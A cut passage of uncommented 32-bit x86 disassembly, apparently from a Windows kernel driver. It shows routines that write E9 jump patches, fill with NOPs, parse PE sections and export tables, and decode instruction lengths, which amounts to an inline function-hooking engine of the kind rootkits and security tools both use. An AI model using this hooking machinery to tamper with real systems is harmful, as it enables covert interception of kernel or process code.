   1968a:	call   0x16d94
   1968f:	push   eax
   19690:	push   DWORD PTR [ebp-0x824]
   19696:	call   0x19a0c
   1969b:	push   eax
   1969c:	push   DWORD PTR [ebp-0x834]
   196a2:	call   0x199b2
   196a7:	mov    edi,eax
   196a9:	add    edi,DWORD PTR [ebp-0x824]
   196af:	push   esi
   196b0:	call   0x115d6
   196b5:	mov    esi,eax
   196b7:	push   edi
   196b8:	call   0x1995a
   196bd:	mov    ecx,DWORD PTR [esi]
   196bf:	mov    eax,DWORD PTR [ecx+eax*4]
   196c2:	mov    ds:0x7ed04,eax
   196c7:	push   DWORD PTR [ebp-0x824]
   196cd:	call   0x19c7c
   196d2:	push   ebx
   196d3:	push   0x19
   196d5:	call   0x109f0
   196da:	call   0x18912
   196df:	mov    BYTE PTR ds:0x7ed40,0x1
   196e6:	jmp    0x19568
   196eb:	xor    eax,eax
   196ed:	call   0x1de68
   196f2:	ret    0x8
   196f5:	int3   
   196f6:	int3   
   196f7:	int3   
   196f8:	int3   
   196f9:	int3   
   196fa:	mov    edi,edi
   196fc:	push   ebp
   196fd:	mov    ebp,esp
   196ff:	push   ecx
   19700:	mov    ecx,DWORD PTR [ebp+0x8]
   19703:	mov    eax,DWORD PTR [ecx+0x4]
   19706:	mov    edx,DWORD PTR [ebp+0xc]
   19709:	push   ebx
   1970a:	mov    ebx,DWORD PTR [edx+0x4]
   1970d:	push   esi
   1970e:	push   edi
   1970f:	mov    DWORD PTR [ebp-0x4],eax
   19712:	mov    DWORD PTR [ebp+0x8],eax
   19715:	cmp    eax,ebx
   19717:	jbe    0x1971c
   19719:	mov    DWORD PTR [ebp+0x8],ebx
   1971c:	xor    eax,eax
   1971e:	cmp    DWORD PTR [ebp+0x8],eax
   19721:	jbe    0x19739
   19723:	mov    esi,DWORD PTR [ecx]
   19725:	mov    edi,DWORD PTR [edx]
   19727:	mov    cl,BYTE PTR [esi+eax*1]
   1972a:	mov    dl,BYTE PTR [edi+eax*1]
   1972d:	cmp    cl,dl
   1972f:	jl     0x19746
   19731:	jg     0x1974a
   19733:	inc    eax
   19734:	cmp    eax,DWORD PTR [ebp+0x8]
   19737:	jb     0x19727
   19739:	cmp    DWORD PTR [ebp-0x4],ebx
   1973c:	setb   al
   1973f:	pop    edi
   19740:	pop    esi
   19741:	pop    ebx
   19742:	leave  
   19743:	ret    0x8
   19746:	mov    al,0x1
   19748:	jmp    0x1973f
   1974a:	xor    al,al
   1974c:	jmp    0x1973f
   1974e:	int3   
   1974f:	int3   
   19750:	int3   
   19751:	int3   
   19752:	int3   
   19753:	int3   
   19754:	mov    edi,edi
   19756:	push   ebp
   19757:	mov    ebp,esp
   19759:	mov    eax,DWORD PTR [ebp+0x8]
   1975c:	mov    ecx,DWORD PTR [eax+0x4]
   1975f:	mov    edx,DWORD PTR [ebp+0xc]
   19762:	cmp    ecx,DWORD PTR [edx+0x4]
   19765:	je     0x1976b
   19767:	xor    al,al
   19769:	jmp    0x1977a
   1976b:	push   esi
   1976c:	mov    esi,DWORD PTR [eax]
   1976e:	push   edi
   1976f:	mov    edi,DWORD PTR [edx]
   19771:	xor    eax,eax
   19773:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   19775:	pop    edi
   19776:	sete   al
   19779:	pop    esi
   1977a:	pop    ebp
   1977b:	ret    0x8
   1977e:	int3   
   1977f:	int3   
   19780:	int3   
   19781:	int3   
   19782:	int3   
   19783:	int3   
   19784:	mov    edi,edi
   19786:	push   ebp
   19787:	mov    ebp,esp
   19789:	push   DWORD PTR [ebp+0xc]
   1978c:	push   DWORD PTR [ebp+0x8]
   1978f:	call   0x19754
   19794:	xor    ecx,ecx
   19796:	test   al,al
   19798:	sete   cl
   1979b:	mov    al,cl
   1979d:	pop    ebp
   1979e:	ret    0x8
   197a1:	int3   
   197a2:	int3   
   197a3:	int3   
   197a4:	int3   
   197a5:	int3   
   197a6:	mov    edi,edi
   197a8:	push   ebp
   197a9:	mov    ebp,esp
   197ab:	push   ecx
   197ac:	mov    ecx,DWORD PTR [ebp+0x8]
   197af:	mov    eax,DWORD PTR [ebp+0xc]
   197b2:	push   ebx
   197b3:	mov    ebx,DWORD PTR [eax+0x4]
   197b6:	push   esi
   197b7:	push   edi
   197b8:	mov    edi,DWORD PTR [ecx+0x4]
   197bb:	mov    DWORD PTR [ebp-0x4],edi
   197be:	cmp    edi,ebx
   197c0:	jbe    0x197c4
   197c2:	mov    edi,ebx
   197c4:	and    DWORD PTR [ebp+0x8],0x0
   197c8:	test   edi,edi
   197ca:	jbe    0x197ea
   197cc:	mov    eax,DWORD PTR [eax]
   197ce:	mov    ecx,DWORD PTR [ecx]
   197d0:	sub    ecx,eax
   197d2:	movzx  edx,WORD PTR [ecx+eax*1]
   197d6:	movzx  esi,WORD PTR [eax]
   197d9:	cmp    dx,si
   197dc:	jb     0x197f7
   197de:	ja     0x197fb
   197e0:	inc    DWORD PTR [ebp+0x8]
   197e3:	inc    eax
   197e4:	inc    eax
   197e5:	cmp    DWORD PTR [ebp+0x8],edi
   197e8:	jb     0x197d2
   197ea:	cmp    DWORD PTR [ebp-0x4],ebx
   197ed:	setb   al
   197f0:	pop    edi
   197f1:	pop    esi
   197f2:	pop    ebx
   197f3:	leave  
   197f4:	ret    0x8
   197f7:	mov    al,0x1
   197f9:	jmp    0x197f0
   197fb:	xor    al,al
   197fd:	jmp    0x197f0
   197ff:	int3   
   19800:	int3   
   19801:	int3   
   19802:	int3   
   19803:	int3   
   19804:	mov    edi,edi
   19806:	push   ebp
   19807:	mov    ebp,esp
   19809:	pop    ebp
   1980a:	jmp    0x196fa
   1980f:	int3   
   19810:	int3   
   19811:	int3   
   19812:	int3   
   19813:	int3   
   19814:	mov    edi,edi
   19816:	push   ebp
   19817:	mov    ebp,esp
   19819:	pop    ebp
   1981a:	jmp    0x19754
   1981f:	int3   
   19820:	int3   
   19821:	int3   
   19822:	int3   
   19823:	int3   
   19824:	mov    edi,edi
   19826:	push   ebp
   19827:	mov    ebp,esp
   19829:	pop    ebp
   1982a:	jmp    0x19784
   1982f:	int3   
   19830:	int3   
   19831:	int3   
   19832:	int3   
   19833:	int3   
   19834:	mov    edi,edi
   19836:	push   ebp
   19837:	mov    ebp,esp
   19839:	pop    ebp
   1983a:	jmp    0x197a6
   1983f:	int3   
   19840:	int3   
   19841:	int3   
   19842:	int3   
   19843:	int3   
   19844:	mov    edi,edi
   19846:	push   ebp
   19847:	mov    ebp,esp
   19849:	mov    eax,DWORD PTR [ebp+0x8]
   1984c:	mov    cl,BYTE PTR [ebp+0xc]
   1984f:	mov    BYTE PTR [eax],cl
   19851:	inc    eax
   19852:	pop    ebp
   19853:	ret    0x8
   19856:	int3   
   19857:	int3   
   19858:	int3   
   19859:	int3   
   1985a:	int3   
   1985b:	int3   
   1985c:	mov    edi,edi
   1985e:	push   ebp
   1985f:	mov    ebp,esp
   19861:	mov    eax,DWORD PTR [ebp+0x8]
   19864:	mov    ecx,DWORD PTR [ebp+0xc]
   19867:	mov    DWORD PTR [eax],ecx
   19869:	add    eax,0x4
   1986c:	pop    ebp
   1986d:	ret    0x8
   19870:	int3   
   19871:	int3   
   19872:	int3   
   19873:	int3   
   19874:	int3   
   19875:	int3   
   19876:	mov    edi,edi
   19878:	push   ebp
   19879:	mov    ebp,esp
   1987b:	mov    eax,DWORD PTR [ebp+0x8]
   1987e:	mov    cx,WORD PTR [ebp+0xc]
   19882:	mov    WORD PTR [eax],cx
   19885:	add    eax,0x2
   19888:	pop    ebp
   19889:	ret    0x8
   1988c:	int3   
   1988d:	int3   
   1988e:	int3   
   1988f:	int3   
   19890:	int3   
   19891:	int3   
   19892:	mov    edi,edi
   19894:	push   ebp
   19895:	mov    ebp,esp
   19897:	push   esi
   19898:	mov    esi,DWORD PTR [ebp+0x10]
   1989b:	push   edi
   1989c:	mov    edi,DWORD PTR [ebp+0x8]
   1989f:	push   esi
   198a0:	push   DWORD PTR [ebp+0xc]
   198a3:	push   edi
   198a4:	call   0x1dade
   198a9:	add    esp,0xc
   198ac:	lea    eax,[edi+esi*1]
   198af:	pop    edi
   198b0:	pop    esi
   198b1:	pop    ebp
   198b2:	ret    0xc
   198b5:	int3   
   198b6:	int3   
   198b7:	int3   
   198b8:	int3   
   198b9:	int3   
   198ba:	mov    edi,edi
   198bc:	push   ebp
   198bd:	mov    ebp,esp
   198bf:	mov    eax,DWORD PTR [ebp+0xc]
   198c2:	mov    ecx,DWORD PTR [ebp+0x8]
   198c5:	sub    ecx,eax
   198c7:	sub    ecx,0x5
   198ca:	mov    BYTE PTR [eax],0xe9
   198cd:	mov    DWORD PTR [eax+0x1],ecx
   198d0:	add    eax,0x5
   198d3:	pop    ebp
   198d4:	ret    0x8
   198d7:	int3   
   198d8:	int3   
   198d9:	int3   
   198da:	int3   
   198db:	int3   
   198dc:	mov    edi,edi
   198de:	push   ebp
   198df:	mov    ebp,esp
   198e1:	push   ecx
   198e2:	push   ebx
   198e3:	mov    ebx,DWORD PTR [ebp+0x8]
   198e6:	and    DWORD PTR [ebp+0x8],0x0
   198ea:	push   edi
   198eb:	mov    edi,ebx
   198ed:	test   ebx,ebx
   198ef:	jne    0x198f5
   198f1:	xor    eax,eax
   198f3:	jmp    0x1994f
   198f5:	push   esi
   198f6:	push   0x20736649
   198fb:	push   0x80
   19900:	push   0x0
   19902:	call   DWORD PTR ds:0x1f02c
   19908:	mov    esi,eax
   1990a:	mov    DWORD PTR [ebp-0x4],esi
   1990d:	push   0x0
   1990f:	push   edi
   19910:	push   esi
   19911:	call   0x19ffe
   19916:	mov    ecx,eax
   19918:	sub    ecx,edi
   1991a:	add    DWORD PTR [ebp+0x8],ecx
   1991d:	add    esi,ecx
   1991f:	cmp    DWORD PTR [ebp+0x8],0x5
   19923:	mov    edi,eax
   19925:	jb     0x1990d
   19927:	push   DWORD PTR [ebp+0x8]
   1992a:	push   0x90
   1992f:	push   ebx
   19930:	call   0x1daf6
   19935:	add    esp,0xc
   19938:	push   esi
   19939:	lea    eax,[ebx+0x5]
   1993c:	push   eax
   1993d:	call   0x198ba
   19942:	push   ebx
   19943:	push   DWORD PTR [ebp+0xc]
   19946:	call   0x198ba
   1994b:	mov    eax,DWORD PTR [ebp-0x4]
   1994e:	pop    esi
   1994f:	pop    edi
   19950:	pop    ebx
   19951:	leave  
   19952:	ret    0x8
   19955:	int3   
   19956:	int3   
   19957:	int3   
   19958:	int3   
   19959:	int3   
   1995a:	mov    edi,edi
   1995c:	push   ebp
   1995d:	mov    ebp,esp
   1995f:	mov    eax,DWORD PTR [ebp+0x8]
   19962:	mov    eax,DWORD PTR [eax+0x1]
   19965:	pop    ebp
   19966:	ret    0x4
   19969:	int3   
   1996a:	int3   
   1996b:	int3   
   1996c:	int3   
   1996d:	int3   
   1996e:	mov    edi,edi
   19970:	push   ebp
   19971:	mov    ebp,esp
   19973:	mov    ecx,DWORD PTR [ebp+0x8]
   19976:	movzx  eax,WORD PTR [ecx+0x14]
   1997a:	lea    eax,[eax+ecx*1+0x18]
   1997e:	movzx  ecx,WORD PTR [ecx+0x6]
   19982:	push   esi
   19983:	xor    esi,esi
   19985:	push   edi
   19986:	test   ecx,ecx
   19988:	jbe    0x199a4
   1998a:	mov    edx,DWORD PTR [eax+0xc]
   1998d:	cmp    DWORD PTR [ebp+0xc],edx
   19990:	jb     0x1999c
   19992:	mov    edi,DWORD PTR [eax+0x8]
   19995:	add    edi,edx
   19997:	cmp    DWORD PTR [ebp+0xc],edi
   1999a:	jb     0x199a6
   1999c:	add    eax,0x28
   1999f:	inc    esi
   199a0:	cmp    esi,ecx
   199a2:	jb     0x1998a
   199a4:	xor    eax,eax
   199a6:	pop    edi
   199a7:	pop    esi
   199a8:	pop    ebp
   199a9:	ret    0x8
   199ac:	int3   
   199ad:	int3   
   199ae:	int3   
   199af:	int3   
   199b0:	int3   
   199b1:	int3   
   199b2:	mov    edi,edi
   199b4:	push   ebp
   199b5:	mov    ebp,esp
   199b7:	push   esi
   199b8:	push   DWORD PTR [ebp+0xc]
   199bb:	mov    esi,DWORD PTR [ebp+0x8]
   199be:	push   esi
   199bf:	call   0x1996e
   199c4:	mov    ecx,eax
   199c6:	test   ecx,ecx
   199c8:	je     0x199db
   199ca:	mov    eax,DWORD PTR [esi+0x3c]
   199cd:	dec    eax
   199ce:	not    eax
   199d0:	and    eax,DWORD PTR [ecx+0x14]
   199d3:	sub    eax,DWORD PTR [ecx+0xc]
   199d6:	add    eax,DWORD PTR [ebp+0xc]
   199d9:	jmp    0x199de
   199db:	mov    eax,DWORD PTR [ebp+0xc]
   199de:	pop    esi
   199df:	pop    ebp
   199e0:	ret    0x8
   199e3:	int3   
   199e4:	int3   
   199e5:	int3   
   199e6:	int3   
   199e7:	int3   
   199e8:	mov    edi,edi
   199ea:	push   ebp
   199eb:	mov    ebp,esp
   199ed:	cmp    DWORD PTR [ebp+0x10],0x0
   199f1:	je     0x199f8
   199f3:	mov    eax,DWORD PTR [ebp+0xc]
   199f6:	jmp    0x19a03
   199f8:	push   DWORD PTR [ebp+0xc]
   199fb:	push   DWORD PTR [ebp+0x8]
   199fe:	call   0x199b2
   19a03:	pop    ebp
   19a04:	ret    0xc
   19a07:	int3   
   19a08:	int3   
   19a09:	int3   
   19a0a:	int3   
   19a0b:	int3   
   19a0c:	mov    edi,edi
   19a0e:	push   ebp
   19a0f:	mov    ebp,esp
   19a11:	sub    esp,0x1c
   19a14:	push   ebx
   19a15:	push   esi
   19a16:	mov    esi,DWORD PTR [ebp+0x8]
   19a19:	push   edi
   19a1a:	push   esi
   19a1b:	call   0x11896
   19a20:	call   eax
   19a22:	mov    ebx,eax
   19a24:	lea    eax,[ebp-0x14]
   19a27:	push   eax
   19a28:	push   0x0
   19a2a:	push   0x0
   19a2c:	push   esi
   19a2d:	mov    DWORD PTR [ebp-0x4],ebx
   19a30:	call   0x118c0
   19a35:	call   eax
   19a37:	mov    edi,eax
   19a39:	mov    eax,DWORD PTR [ebx+0x50]
   19a3c:	mov    ecx,edi
   19a3e:	sub    ecx,esi
   19a40:	cmp    eax,ecx
   19a42:	jb     0x19a93
   19a44:	mov    ecx,DWORD PTR [ebp-0x14]
   19a47:	sub    ecx,esi
   19a49:	add    ecx,edi
   19a4b:	cmp    eax,ecx
   19a4d:	jb     0x19a93
   19a4f:	push   DWORD PTR [ebp+0x10]
   19a52:	push   DWORD PTR [edi+0x20]
   19a55:	push   ebx
   19a56:	call   0x199e8
   19a5b:	push   DWORD PTR [ebp+0x10]
   19a5e:	mov    ebx,eax
   19a60:	push   DWORD PTR [edi+0x1c]
   19a63:	add    ebx,esi
   19a65:	push   DWORD PTR [ebp-0x4]
   19a68:	call   0x199e8
   19a6d:	push   DWORD PTR [ebp+0x10]
   19a70:	add    eax,esi
   19a72:	push   DWORD PTR [edi+0x24]
   19a75:	mov    DWORD PTR [ebp-0x1c],eax
   19a78:	push   DWORD PTR [ebp-0x4]
   19a7b:	call   0x199e8
   19a80:	and    DWORD PTR [ebp-0xc],0x0
   19a84:	add    eax,esi
   19a86:	mov    esi,DWORD PTR [edi+0x18]
   19a89:	mov    DWORD PTR [ebp-0x18],eax
   19a8c:	mov    DWORD PTR [ebp-0x8],esi
   19a8f:	test   esi,esi
   19a91:	jg     0x19a9f
   19a93:	xor    eax,eax
   19a95:	pop    edi
   19a96:	pop    esi
   19a97:	pop    ebx
   19a98:	leave  
   19a99:	ret    0xc
   19a9c:	mov    esi,DWORD PTR [ebp-0x8]
   19a9f:	mov    eax,DWORD PTR [ebp-0xc]
   19aa2:	push   DWORD PTR [ebp+0x10]
   19aa5:	add    esi,eax
   19aa7:	mov    eax,DWORD PTR [ebp+0xc]
   19aaa:	sar    esi,1
   19aac:	push   DWORD PTR [ebx+esi*4]
   19aaf:	mov    DWORD PTR [ebp-0x10],eax
   19ab2:	push   DWORD PTR [ebp-0x4]
   19ab5:	call   0x199e8
   19aba:	add    eax,DWORD PTR [ebp+0x8]
   19abd:	mov    cl,BYTE PTR [eax]
   19abf:	mov    edx,DWORD PTR [ebp-0x10]
   19ac2:	cmp    cl,BYTE PTR [edx]
   19ac4:	jne    0x19ae1
   19ac6:	test   cl,cl
   19ac8:	je     0x19add
   19aca:	mov    cl,BYTE PTR [eax+0x1]
   19acd:	cmp    cl,BYTE PTR [edx+0x1]
   19ad0:	jne    0x19ae1
   19ad2:	inc    eax
   19ad3:	inc    eax
   19ad4:	inc    edx
   19ad5:	inc    edx
   19ad6:	mov    DWORD PTR [ebp-0x10],edx
   19ad9:	test   cl,cl
   19adb:	jne    0x19abd
   19add:	xor    eax,eax
   19adf:	jmp    0x19ae6
   19ae1:	sbb    eax,eax
   19ae3:	sbb    eax,0xffffffff
   19ae6:	test   eax,eax
   19ae8:	je     0x19aff
   19aea:	jge    0x19af2
   19aec:	inc    esi
   19aed:	mov    DWORD PTR [ebp-0xc],esi
   19af0:	jmp    0x19af5
   19af2:	mov    DWORD PTR [ebp-0x8],esi
   19af5:	mov    eax,DWORD PTR [ebp-0x8]
   19af8:	cmp    DWORD PTR [ebp-0xc],eax
   19afb:	jl     0x19a9c
   19afd:	jmp    0x19a93
   19aff:	mov    eax,DWORD PTR [ebp-0x18]
   19b02:	movzx  eax,WORD PTR [eax+esi*2]
   19b06:	mov    ecx,DWORD PTR [ebp-0x1c]
   19b09:	mov    ecx,DWORD PTR [ecx+eax*4]
   19b0c:	mov    eax,ecx
   19b0e:	sub    eax,edi
   19b10:	add    eax,DWORD PTR [ebp+0x8]
   19b13:	cmp    eax,DWORD PTR [ebp-0x14]
   19b16:	sbb    eax,eax
   19b18:	not    eax
   19b1a:	and    eax,ecx
   19b1c:	jmp    0x19a95
   19b21:	int3   
   19b22:	int3   
   19b23:	int3   
   19b24:	int3   
   19b25:	int3   
   19b26:	mov    edi,edi
   19b28:	push   ebp
   19b29:	mov    ebp,esp
   19b2b:	sub    esp,0x818
   19b31:	mov    eax,ds:0x7eb38
   19b36:	xor    eax,ebp
   19b38:	mov    DWORD PTR [ebp-0x4],eax
   19b3b:	mov    eax,DWORD PTR [ebp+0x8]
   19b3e:	mov    ecx,DWORD PTR [ebp+0xc]
   19b41:	push   esi
   19b42:	push   edi
   19b43:	mov    DWORD PTR [ebp-0x7e4],eax
   19b49:	xor    esi,esi
   19b4b:	xor    eax,eax
   19b4d:	push   ecx
   19b4e:	mov    DWORD PTR [ebp-0x7f0],esi
   19b54:	lea    edi,[ebp-0x7ec]
   19b5a:	stos   DWORD PTR es:[edi],eax
   19b5b:	lea    eax,[ebp-0x7d4]
   19b61:	push   0x1ec5a
   19b66:	push   eax
   19b67:	mov    DWORD PTR [ebp-0x7dc],esi
   19b6d:	mov    DWORD PTR [ebp-0x7e8],esi
   19b73:	call   DWORD PTR ds:0x1f048
   19b79:	add    esp,0xc
   19b7c:	lea    eax,[ebp-0x7d4]
   19b82:	push   eax
   19b83:	lea    eax,[ebp-0x810]
   19b89:	push   eax
   19b8a:	call   0x11c5c
   19b8f:	call   eax
   19b91:	push   0x10
   19b93:	lea    eax,[ebp-0x810]
   19b99:	mov    DWORD PTR [ebp-0x800],eax
   19b9f:	push   0x1
   19ba1:	lea    eax,[ebp-0x818]
   19ba7:	push   eax
   19ba8:	lea    eax,[ebp-0x808]
   19bae:	push   eax
   19baf:	push   0x80100000
   19bb4:	lea    eax,[ebp-0x7e0]
   19bba:	push   eax
   19bbb:	mov    DWORD PTR [ebp-0x808],0x18
   19bc5:	mov    DWORD PTR [ebp-0x804],esi
   19bcb:	mov    DWORD PTR [ebp-0x7fc],esi
   19bd1:	mov    DWORD PTR [ebp-0x7f8],esi
   19bd7:	mov    DWORD PTR [ebp-0x7f4],esi
   19bdd:	call   0x11746
   19be2:	call   eax
   19be4:	cmp    eax,esi
   19be6:	jl     0x19c67
   19be8:	push   ebx
   19be9:	push   DWORD PTR [ebp-0x7e0]
   19bef:	lea    eax,[ebp-0x7f0]
   19bf5:	push   DWORD PTR [ebp+0x10]
   19bf8:	push   0x2
   19bfa:	push   eax
   19bfb:	push   esi
   19bfc:	push   0x4
   19bfe:	lea    eax,[ebp-0x7d8]
   19c04:	push   eax
   19c05:	call   DWORD PTR ds:0x1f054
   19c0b:	push   DWORD PTR [ebp-0x7e0]
   19c11:	mov    edi,DWORD PTR ds:0x1f060
   19c17:	mov    ebx,eax
   19c19:	call   edi
   19c1b:	cmp    ebx,esi
   19c1d:	jl     0x19c52
   19c1f:	push   0x2
   19c21:	push   esi
   19c22:	push   0x2
   19c24:	lea    eax,[ebp-0x7e8]
   19c2a:	push   eax
   19c2b:	push   esi
   19c2c:	push   esi
   19c2d:	push   esi
   19c2e:	lea    eax,[ebp-0x7dc]
   19c34:	push   eax
   19c35:	push   0xffffffff
   19c37:	push   DWORD PTR [ebp-0x7d8]
   19c3d:	call   0x11bde
   19c42:	call   eax
   19c44:	push   DWORD PTR [ebp-0x7d8]
   19c4a:	mov    ebx,eax
   19c4c:	call   edi
   19c4e:	cmp    ebx,esi
   19c50:	jge    0x19c56
   19c52:	mov    eax,ebx
   19c54:	jmp    0x19c66
   19c56:	mov    eax,DWORD PTR [ebp-0x7dc]
   19c5c:	mov    ecx,DWORD PTR [ebp-0x7e4]
   19c62:	mov    DWORD PTR [ecx],eax
   19c64:	xor    eax,eax
   19c66:	pop    ebx
   19c67:	mov    ecx,DWORD PTR [ebp-0x4]
   19c6a:	pop    edi
   19c6b:	xor    ecx,ebp
   19c6d:	pop    esi
   19c6e:	call   0x1da79
   19c73:	leave  
   19c74:	ret    0xc
   19c77:	int3   
   19c78:	int3   
   19c79:	int3   
   19c7a:	int3   
   19c7b:	int3   
   19c7c:	mov    edi,edi
   19c7e:	push   ebp
   19c7f:	mov    ebp,esp
   19c81:	push   DWORD PTR [ebp+0x8]
   19c84:	push   0xffffffff
   19c86:	call   0x11c08
   19c8b:	call   eax
   19c8d:	pop    ebp
   19c8e:	ret    0x4
   19c91:	int3   
   19c92:	int3   
   19c93:	int3   
   19c94:	int3   
   19c95:	int3   
   19c96:	mov    edi,edi
   19c98:	push   ebp
   19c99:	mov    ebp,esp
   19c9b:	push   esi
   19c9c:	mov    esi,DWORD PTR [ebp+0x8]
   19c9f:	test   esi,esi
   19ca1:	jne    0x19ca6
   19ca3:	lea    esi,[ecx+0x18]
   19ca6:	mov    edx,DWORD PTR [ebp+0xc]
   19ca9:	test   edx,edx
   19cab:	jne    0x19cb1
   19cad:	xor    eax,eax
   19caf:	jmp    0x19cc1
   19cb1:	movzx  eax,BYTE PTR [edx]
   19cb4:	push   edx
   19cb5:	lea    eax,[eax*8+0x7a400]
   19cbc:	push   esi
   19cbd:	push   eax
   19cbe:	call   DWORD PTR [eax+0x4]
   19cc1:	pop    esi
   19cc2:	pop    ebp
   19cc3:	ret    0x8
   19cc6:	int3   
   19cc7:	int3   
   19cc8:	int3   
   19cc9:	int3   
   19cca:	int3   
   19ccb:	int3   
   19ccc:	mov    edi,edi
   19cce:	push   ebp
   19ccf:	mov    ebp,esp
   19cd1:	mov    eax,DWORD PTR [ebp+0x14]
   19cd4:	push   ebx
   19cd5:	mov    ebx,DWORD PTR [ebp+0x8]
   19cd8:	push   esi
   19cd9:	mov    esi,DWORD PTR [ebp+0x10]
   19cdc:	sub    esi,eax
   19cde:	push   edi
   19cdf:	lea    edi,[ebx+eax*1]
   19ce2:	mov    eax,esi
   19ce4:	xor    edx,edx
   19ce6:	dec    eax
   19ce7:	je     0x19d08
   19ce9:	dec    eax
   19cea:	je     0x19cfa
   19cec:	dec    eax
   19ced:	dec    eax
   19cee:	jne    0x19d14
   19cf0:	mov    eax,DWORD PTR [ecx+0xc]
   19cf3:	mov    edx,DWORD PTR [edi]
   19cf5:	and    DWORD PTR [eax],0x0
   19cf8:	jmp    0x19d14
   19cfa:	mov    eax,DWORD PTR [ecx+0xc]
   19cfd:	movsx  edx,WORD PTR [edi]
   19d00:	mov    DWORD PTR [eax],0x2
   19d06:	jmp    0x19d14
   19d08:	mov    eax,DWORD PTR [ecx+0xc]
   19d0b:	movsx  edx,BYTE PTR [edi]
   19d0e:	mov    DWORD PTR [eax],0x3
   19d14:	mov    ecx,DWORD PTR [ebp+0xc]
   19d17:	lea    eax,[edx+ecx*1]
   19d1a:	add    eax,DWORD PTR [ebp+0x10]
   19d1d:	sub    edx,ebx
   19d1f:	add    edx,ecx
   19d21:	dec    esi
   19d22:	je     0x19d34
   19d24:	dec    esi
   19d25:	je     0x19d2f
   19d27:	dec    esi
   19d28:	dec    esi
   19d29:	jne    0x19d36
   19d2b:	mov    DWORD PTR [edi],edx
   19d2d:	jmp    0x19d36
   19d2f:	mov    WORD PTR [edi],dx
   19d32:	jmp    0x19d36
   19d34:	mov    BYTE PTR [edi],dl
   19d36:	pop    edi
   19d37:	pop    esi
   19d38:	pop    ebx
   19d39:	pop    ebp
   19d3a:	ret    0x10
   19d3d:	int3   
   19d3e:	int3   
   19d3f:	int3   
   19d40:	int3   
   19d41:	int3   
   19d42:	mov    edi,edi
   19d44:	push   ebp
   19d45:	mov    ebp,esp
   19d47:	mov    eax,DWORD PTR [ebp+0x10]
   19d4a:	inc    eax
   19d4b:	pop    ebp
   19d4c:	ret    0xc
   19d4f:	int3   
   19d50:	int3   
   19d51:	int3   
   19d52:	int3   
   19d53:	int3   
   19d54:	mov    edi,edi
   19d56:	push   ebp
   19d57:	mov    ebp,esp
   19d59:	mov    eax,ecx
   19d5b:	mov    ecx,DWORD PTR [ebp+0x8]
   19d5e:	and    DWORD PTR [eax],0x0
   19d61:	and    DWORD PTR [eax+0x4],0x0
   19d65:	test   ecx,ecx
   19d67:	jne    0x19d6c
   19d69:	lea    ecx,[eax+0x14]
   19d6c:	mov    edx,DWORD PTR [ebp+0xc]
   19d6f:	mov    DWORD PTR [eax+0x8],ecx
   19d72:	test   edx,edx
   19d74:	jne    0x19d79
   19d76:	lea    edx,[eax+0x10]
   19d79:	mov    DWORD PTR [eax+0xc],edx
   19d7c:	and    DWORD PTR [ecx],0x0
   19d7f:	mov    ecx,DWORD PTR [eax+0xc]
   19d82:	and    DWORD PTR [ecx],0x0
   19d85:	pop    ebp
   19d86:	ret    0x8
   19d89:	int3   
   19d8a:	int3   
   19d8b:	int3   
   19d8c:	int3   
   19d8d:	int3   
   19d8e:	mov    edi,edi
   19d90:	push   ebp
   19d91:	mov    ebp,esp
   19d93:	push   ecx
   19d94:	mov    eax,DWORD PTR [ebp+0x8]
   19d97:	mov    eax,DWORD PTR [eax]
   19d99:	push   ebx
   19d9a:	push   esi
   19d9b:	push   edi
   19d9c:	mov    DWORD PTR [ebp-0x4],ecx
   19d9f:	mov    esi,eax
   19da1:	test   eax,0x200000
   19da6:	je     0x19db3
   19da8:	cmp    DWORD PTR [ecx+0x4],0x0
   19dac:	je     0x19db8
   19dae:	shr    esi,0xb
   19db1:	jmp    0x19dbb
   19db3:	cmp    DWORD PTR [ecx],0x0
   19db6:	jmp    0x19dac
   19db8:	shr    esi,0x8
   19dbb:	mov    ebx,DWORD PTR [ebp+0x10]
   19dbe:	and    esi,0x7
   19dc1:	shr    eax,0xe
   19dc4:	and    eax,0x7
   19dc7:	mov    edi,esi
   19dc9:	jbe    0x19e05
   19dcb:	add    eax,ebx
   19dcd:	mov    cl,BYTE PTR [eax]
   19dcf:	movzx  edx,cl
   19dd2:	mov    dl,BYTE PTR [edx+0x7a300]
   19dd8:	test   dl,0x10
   19ddb:	je     0x19dfd
   19ddd:	mov    al,BYTE PTR [eax+0x1]
   19de0:	and    al,0x7
   19de2:	cmp    al,0x5
   19de4:	jne    0x19dfd
   19de6:	and    cl,0xc0
   19de9:	je     0x19dfa
   19deb:	cmp    cl,0x40
   19dee:	jne    0x19df5
   19df0:	lea    edi,[esi+0x1]
   19df3:	jmp    0x19dfd
   19df5:	cmp    cl,0x80
   19df8:	jne    0x19dfd
   19dfa:	lea    edi,[esi+0x4]
   19dfd:	movzx  eax,dl
   19e00:	and    eax,0xf
   19e03:	add    edi,eax
   19e05:	push   edi
   19e06:	push   ebx
   19e07:	push   DWORD PTR [ebp+0xc]
   19e0a:	call   0x1dade
   19e0f:	mov    ecx,DWORD PTR [ebp+0x8]
   19e12:	mov    eax,DWORD PTR [ecx]
   19e14:	shl    eax,0xc
   19e17:	sar    eax,0x1d
   19e1a:	add    esp,0xc
   19e1d:	test   eax,eax
   19e1f:	je     0x19e3b
   19e21:	push   eax
   19e22:	push   esi
   19e23:	mov    esi,DWORD PTR [ebp-0x4]
   19e26:	push   ebx
   19e27:	push   DWORD PTR [ebp+0xc]
   19e2a:	mov    ecx,esi
   19e2c:	call   0x19ccc
   19e31:	mov    ecx,DWORD PTR [esi+0x8]
   19e34:	mov    DWORD PTR [ecx],eax
   19e36:	mov    ecx,DWORD PTR [ebp+0x8]
   19e39:	jmp    0x19e3e
   19e3b:	mov    esi,DWORD PTR [ebp-0x4]
   19e3e:	test   DWORD PTR [ecx],0x400000
   19e44:	je     0x19e4b
   19e46:	mov    eax,DWORD PTR [esi+0xc]
   19e49:	neg    DWORD PTR [eax]
   19e4b:	test   DWORD PTR [ecx],0x100000
   19e51:	je     0x19e59
   19e53:	mov    eax,DWORD PTR [esi+0x8]
   19e56:	or     DWORD PTR [eax],0xffffffff
   19e59:	lea    eax,[edi+ebx*1]
   19e5c:	pop    edi
   19e5d:	pop    esi
   19e5e:	pop    ebx
   19e5f:	leave  
   19e60:	ret    0xc
   19e63:	int3   
   19e64:	int3   
   19e65:	int3   
   19e66:	int3   
   19e67:	int3   
   19e68:	mov    edi,edi
   19e6a:	push   ebp
   19e6b:	mov    ebp,esp
   19e6d:	push   ebx
   19e6e:	push   esi
   19e6f:	mov    esi,DWORD PTR [ebp+0x10]
